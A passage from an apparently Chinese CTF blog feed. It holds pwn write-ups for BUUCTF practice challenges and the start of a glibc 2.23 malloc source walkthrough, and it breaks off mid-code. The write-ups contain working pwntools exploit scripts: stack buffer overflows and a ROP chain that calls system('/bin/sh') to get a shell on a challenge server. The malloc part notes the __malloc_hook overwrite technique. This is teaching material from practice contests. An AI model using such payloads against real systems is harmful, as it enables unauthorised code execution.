class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"binsh_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#exit_addr = 0x00000000000013213</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"------------------------------ leak success! -------------------------------------------"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"------------------------------ getshell -------------------------------------------"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span><span class="token string">"\x00"</span> <span class="token operator">+</span>  <span class="token string">"b"</span><span class="token operator">*</span><span class="token punctuation">(</span>offset<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#one_gadget = libcbase + 0x45216</span><span class="token comment" spellcheck="true">#payload = "b"*offset + p64(one_gadget)</span><span class="token triple-quoted-string string">'''log.info(hex(len(payload)))payload_list = []for x in range(len(payload)):    payload_list.append(payload[x])#    print payload[x]print payload_listfor x in range(len(payload_list)):    if ord(payload_list[x])&lt;=96 or ord(payload_list[x])>122:        if ord(payload_list[x])&lt;=64 or ord(payload_list[x]) > 90:            if ord(payload_list[x])>47 and ord(payload_list[x])&lt;=57:                payload_list[x] = chr(ord(payload_list[x])^0xf)        else:            payload_list[x] = chr(ord(payload_list[x])^0xe)    else:        payload_list[x] = chr(ord(payload_list[x])^0xd)payload_change = ""for x in range(len(payload_list)):    payload_change+=payload_list[x]log.info(hex(len(payload_change)))print payload_change'''</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your choice!\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your Plaintext to be encrypted\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#r.recv()</span><span class="token comment" spellcheck="true"># r.recv()</span><span class="token comment" spellcheck="true">#sleep(0.2)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>主函数逻辑简单异常，一看就是利用gets的漏洞改写v2变量，不过值得学习的是浮点数相关知识和一些汇编指令，因为其采用的是<strong>SSE指令集</strong><br><img src="/2020/01/30/buu/image-20200111150727079.png" title="This is an image"></p><h3 id="相关汇编指令"><a href="#相关汇编指令" class="headerlink" title="相关汇编指令"></a>相关汇编指令</h3><pre><code>pxor ---&gt; 异或指令movss ---&gt; 单精度复制ucomiss ---&gt; 比较指令</code></pre><p>属实要是算浮点数写进去还挺难的，但是动态调式我们可直接得到相关的数据，完美，然而试了之后发现我太年轻了，不过IDA里面总还是有的。<br><img src="/2020/01/30/buu/image-20200111153939152.png" title="This is an image"></p><p>贴个exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29962</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#r = process('./ciscn_2019_n_1')</span>payload <span class="token operator">=</span> <span class="token number">0x2c</span> <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x322e3131</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">0x2c</span> <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x41348000</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><p>题目里面关键函数看起来挺乱的。<br><img src="/2020/01/30/buu/image-20200111143412029.png" title="This is an image"></p><p>不过这些C++ std::string之类的不需要逆向，基本没其关键作用</p><p>〜std :: string可以忽略，它只是字符串的析构函数，它将在所有实际代码完成后执行。</p><pre class=" language-c++"><code class="language-c++">  printf("Tell me something about yourself: ");  fgets(&s, 32, edata);  std::string::operator=(&input, &s);  std::allocator<char>::allocator(&v6);  std::string::string(&v5, "you", &v6);  std::allocator<char>::allocator(&v8);  std::string::string(&v7, "I", &v8);  replace((std::string *)&v4, (std::string *)&input, (std::string *)&v7);  std::string::operator=(&input, &v4, v0, &v5);  std::string::~string((std::string *)&v4);  std::string::~string((std::string *)&v7);  std::allocator<char>::~allocator((int)&v8);  std::string::~string((std::string *)&v5);  std::allocator<char>::~allocator((int)&v6);  v1 = (const char *)std::string::c_str((std::string *)&input);  strcpy(&s, v1);  return printf("So, %s\n", &s);</code></pre><p>这些其实你就需要知道用了replace函数就行了，不过看大佬逆向的很完美。</p><pre class=" language-C++"><code class="language-C++">void vuln(){    char buffer[32];    printf("Greeting");    fgets(buffer, 32, stdin);    // Not sure if the parameters are right here but the idea is the same.    std::string fixed = replace(std::string(buffer), std::string("I"), std::string("you"));    strcpy(buffer, fixed.c_str());    printf("So %s\n", buffer);}</code></pre><p>可以看到replace函数把I替换成了you这就相当于扩大了字符串长度，实现了栈溢出</p><pre class=" language-python"><code class="language-python">offset <span class="token operator">=</span> <span class="token number">21</span>payload <span class="token operator">=</span> <span class="token string">'I'</span> <span class="token operator">*</span> offset <span class="token operator">+</span> <span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x8048F0D</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><pre class=" language-python"><code class="language-python">offset <span class="token operator">=</span> <span class="token number">0x40</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x48</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000040060D</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#debug(0x0000000004006A3)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre><p>题目很简单</p>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Glibc-2.23-malloc源码审计</title>
      <link href="/2020/01/30/glibc-2-23-malloc-yuan-ma-shen-ji/"/>
      <url>/2020/01/30/glibc-2-23-malloc-yuan-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Glibc-2-23-malloc源码审计"><a href="#Glibc-2-23-malloc源码审计" class="headerlink" title="Glibc-2.23-malloc源码审计"></a>Glibc-2.23-malloc源码审计</h1><blockquote><p>malloc经常用，但是之前光看了关键代码，没有细读，寒假正好有时间深入学习堆利用，就想着同时深入了解malloc的堆分配机理，glibc-2.23</p></blockquote><p>开头前1000行都是各种注释和定义，可以边看下面的代码然后对比上面的注释和定义<br>这个是malloc_chunk结构体</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> malloc_chunk <span class="token punctuation">{</span>  INTERNAL_SIZE_T      prev_size<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Size of previous chunk (if free).  */</span>  INTERNAL_SIZE_T      size<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* Size in bytes, including overhead. */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> fd<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> bk<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Only used for large blocks: pointer to next larger size.  */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>这又定义了bin的个数，同时也把malloc_chunk结构体指针定义为<strong>mchunkptr</strong><br><img src="/2020/01/30/glibc-2-23-malloc-yuan-ma-shen-ji/image-20200117194803518.png" title="This is an image"></p><p>这里定义了_arena结构体，并赋给了结构体变量arena</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _arena <span class="token punctuation">{</span>  mbinptr av<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>NAV <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> _arena <span class="token operator">*</span>next<span class="token punctuation">;</span>  size_t size<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">if</span> THREAD_STATS</span>  <span class="token keyword">long</span> stat_lock_direct<span class="token punctuation">,</span> stat_lock_loop<span class="token punctuation">,</span> stat_lock_wait<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>  mutex_t mutex<span class="token punctuation">;</span><span class="token punctuation">}</span> arena<span class="token punctuation">;</span></code></pre><p>这里定义了heapinfo结构体</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _heap_info <span class="token punctuation">{</span>  arena <span class="token operator">*</span>ar_ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Arena for this heap. */</span>  <span class="token keyword">struct</span> _heap_info <span class="token operator">*</span>prev<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Previous heap. */</span>  size_t size<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* Current size in bytes. */</span>  size_t pad<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Make sure the following data is properly aligned. */</span><span class="token punctuation">}</span> heap_info<span class="token punctuation">;</span></code></pre><p>隐式链接的相关定义</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* extract p's inuse bit 这里面精彩的利用了逻辑运算*/</span><span class="token macro property">#<span class="token directive keyword">define</span> inuse(p) (next_chunk(p)->size &amp; PREV_INUSE) </span><span class="token comment" spellcheck="true">/* extract inuse bit of previous chunk */</span><span class="token macro property">#<span class="token directive keyword">define</span> prev_inuse(p)  ((p)->size &amp; PREV_INUSE)</span><span class="token comment" spellcheck="true">/* check for mmap()'ed chunk */</span><span class="token macro property">#<span class="token directive keyword">define</span> chunk_is_mmapped(p) ((p)->size &amp; IS_MMAPPED)</span><span class="token comment" spellcheck="true">/* set/clear chunk as in use without otherwise disturbing */</span><span class="token macro property">#<span class="token directive keyword">define</span> set_inuse(p) (next_chunk(p)->size |= PREV_INUSE)</span><span class="token macro property">#<span class="token directive keyword">define</span> clear_inuse(p) (next_chunk(p)->size &amp;= ~PREV_INUSE)</span></code></pre><p>small_bin</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> MAX_SMALLBIN         63 </span><span class="token comment" spellcheck="true">//这个其实最多有62个small_bin</span><span class="token macro property">#<span class="token directive keyword">define</span> MAX_SMALLBIN_SIZE   512</span><span class="token macro property">#<span class="token directive keyword">define</span> SMALLBIN_WIDTH        8</span><span class="token comment" spellcheck="true">/*   Requests are `small' if both the corresponding and the next bin are small*/</span><span class="token macro property">#<span class="token directive keyword">define</span> is_small_request(nb) ((nb) &lt; MAX_SMALLBIN_SIZE - SMALLBIN_WIDTH)</span></code></pre><p>上面都是一些定义，下面记录一下malloc究竟是一步步怎么走的。<br>首先给出一个实验的小程序：</p><pre><code>/*************************************************************************    &gt; File Name: test.c    &gt; Author: 时钟    &gt; Mail: 522796871@qq.com    &gt; Created Time: 2020年01月17日 星期五 19时58分40秒 ************************************************************************/#include&lt;stdio.h&gt;int main(){    void *ptr1 = malloc(0x10);    void *ptr2 = malloc(0x10);    return 0;}</code></pre><p>然后我们观看源码，同时编译glibc进行调试看看在libc内部malloc如何操作：<br><img src="/2020/01/30/glibc-2-23-malloc-yuan-ma-shen-ji/image-20200117200635692.png" title="This is an image"></p><p>可以看出malloc调用的是libc中的__libc_malloc，同时我们看其源码，同时单步运行就可以看出</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">__libc_malloc</span> <span class="token punctuation">(</span>size_t bytes<span class="token punctuation">)</span><span class="token punctuation">{</span>  mstate ar_ptr<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>    <span class="token operator">=</span> <span class="token function">atomic_forced_read</span> <span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>hook <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token function">RETURN_ADDRESS</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">arena_get</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  victim <span class="token operator">=</span> <span class="token function">_int_malloc</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Retry with another arena only if we were able to find a usable arena     before.  */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>victim <span class="token operator">&amp;&amp;</span> ar_ptr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">LIBC_PROBE</span> <span class="token punctuation">(</span>memory_malloc_retry<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>      ar_ptr <span class="token operator">=</span> <span class="token function">arena_get_retry</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>      victim <span class="token operator">=</span> <span class="token function">_int_malloc</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ar_ptr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token function">mutex_unlock</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>ar_ptr<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token operator">!</span>victim <span class="token operator">||</span> <span class="token function">chunk_is_mmapped</span> <span class="token punctuation">(</span><span class="token function">mem2chunk</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>          ar_ptr <span class="token operator">==</span> <span class="token function">arena_for_chunk</span> <span class="token punctuation">(</span><span class="token function">mem2chunk</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> victim<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>其中第一个要关注的就是</p><h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="__malloc_hook"></a>__malloc_hook</h3><pre class=" language-c"><code class="language-c"> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>hook <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token function">RETURN_ADDRESS</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我们调试可以看出，malloc在开始的时候就判断<strong>__malloc_hook</strong>中的值是否为NULL，如果不是的话就执行<strong>__malloc_hook</strong>里面的内容，这就是为什么堆利用的时候很多情况下都在实现任意写之后把one_gadget放入到<strong>__malloc_hook_</strong>，同时其实这部分也有一些初始化的作用，不过现在来说不重要。</p><p>当然，实验时<strong>__malloc_hook</strong>里面就是NULL，所以会跳过这一步，继续执行。</p><p>然后就是arena_get了，arena_get作为一个宏定义定义在arena.c中，主要是获取指针，加锁之类的，接下来才是真正重要的：调用_int_malloc,其实<strong>__libc_malloc</strong>主要就是调用的<strong>int_malloc</strong>（改函数源码贼长我就不贴了，分析的时候贴关键部分）</p><img src="/2020/01/30/glibc-2-23-malloc-yuan-ma-shen-ji/image-20200117203733917.png" title="This is an image"><p>调试之前先看看源码：</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">_int_malloc</span> <span class="token punctuation">(</span>mstate av<span class="token punctuation">,</span> size_t bytes<span class="token punctuation">)</span><span class="token punctuation">{</span>  INTERNAL_SIZE_T nb<span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">/* normalized request size 用户请求的大小*/</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> idx<span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">/* associated bin index bin的索引*/</span>  mbinptr bin<span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">/* associated bin */</span>  mchunkptr victim<span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">/* inspected/selected chunk 由上面我们可以知道这是一个malloc_chunk指针*/</span>  INTERNAL_SIZE_T size<span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/* its size 它的大小*/</span>  <span class="token keyword">int</span> victim_index<span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">/* its bin index 它所在bin的索引*/</span>  mchunkptr remainder<span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">/* remainder from a split 还是一个malloc_chunk指针*/</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> remainder_size<span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">/* its size */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> block<span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">/* bit map traverser */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> bit<span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">/* bit map traverser */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> map<span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">/* current word of binmap */</span>  mchunkptr fwd<span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">/* misc temp for linking free后的link_list里面的fd指针*/</span>  mchunkptr bck<span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">/* misc temp for linking free后的link_list里面的bc指针*/</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>errstr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//</span></code></pre><p>首先是一顿声明操作，我给翻译成中文给大家看，然后我们进入该函数<br><img src="/2020/01/30/glibc-2-23-malloc-yuan-ma-shen-ji/image-20200117210204094.png" title="This is an image"></p><p>可以看到第一个操作就是通过对齐和自己申请的size算出合适的chunk大小，这个函数执行完之后nb就是申请出的chunk的大小,bytes在64位时是16,32位时是8。<br><img src="/2020/01/30/glibc-2-23-malloc-yuan-ma-shen-ji/image-20200121124906589.png" title="This is an image"></p><p>至于这里，就是判断arena了，av就是当前的arena，是由上面__libc_malloc里面的arena_get得来的,如果为NULL就会调用sysmalloc通过mmp分配新的可用区域进而获得chunk，很多情况下应该是不会等于NULL的，当然有些利用方式会需要我们人为去消耗点很多堆块进入mmap分配。</p><p>接下来就是重点了。</p><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p>通过2.23的源码我们看到,malloc里面关于fastbin的优先级是很高的（2.26引入tcache之后就不是了）。</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> get_max_fast() global_max_fast</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> malloc_chunk <span class="token operator">*</span>mfastbinptr<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[idx])</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">get_max_fast</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      idx <span class="token operator">=</span> <span class="token function">fastbin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//通过chunk_size求出对应的idx</span>      mfastbinptr <span class="token operator">*</span>fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//看上面的typedef 所以fastbin通过av(arena)和idx来找到对应堆块的地址赋给一个malloc_chunk指针</span>      mchunkptr pp <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//pp指向申请出来的堆块</span>      <span class="token keyword">do</span>        <span class="token punctuation">{</span>          victim <span class="token operator">=</span> pp<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//victim指向申请出来的堆块</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pp <span class="token operator">=</span> <span class="token function">catomic_compare_and_exchange_val_acq</span> <span class="token punctuation">(</span>fb<span class="token punctuation">,</span> victim<span class="token operator">-></span>fd<span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//从刚取出的chunk中将bin链表的表头设置为改chunk的fd。</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">fastbin_index</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//idx和chunk_size对应</span>            <span class="token punctuation">{</span>              errstr <span class="token operator">=</span> <span class="token string">"malloc(): memory corruption (fast)"</span><span class="token punctuation">;</span>            errout<span class="token punctuation">:</span>              <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> errstr<span class="token punctuation">,</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token function">check_remalloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回一个指向mem区域（意思就是指向fd所在的地方）的指针</span>          <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> p<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>通过宏定义我们就可以知道get_max_fast()其实就是返回一个fastbin的最大值，nb是之前通过申请的size求出来的chunk的真实size.</p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>fastbin判断之后就是small bin的判断，其中smallbin在32位机上最大是512，在64位上是1024，源码中也给出了计算方法，可以康康。</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> in_smallbin_range(sz)  \  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE) </span><span class="token macro property">#<span class="token directive keyword">define</span> first(b)     ((b)->fd)</span><span class="token macro property">#<span class="token directive keyword">define</span> last(b)      ((b)->bk)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断nb是否在small_bin的范围内</span>    <span class="token punctuation">{</span>      idx <span class="token operator">=</span> <span class="token function">smallbin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//求出对应的idx</span>      bin <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//根据arena和idx算出所在的bin链表的地址</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">last</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> bin<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//取出bin的bk内容</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* initialization check 判断是否初始化如果*/</span>            <span class="token function">malloc_consolidate</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//初始化，里面最主要的操作就是check_malloc_state()函数，对malloc_state也就是arena里面的各个内容进行初始化</span>          <span class="token keyword">else</span>            <span class="token punctuation">{</span>              bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//要取出的chunk的bk,其实就是和链表中它紧邻的下一个chunk</span>    <span class="token 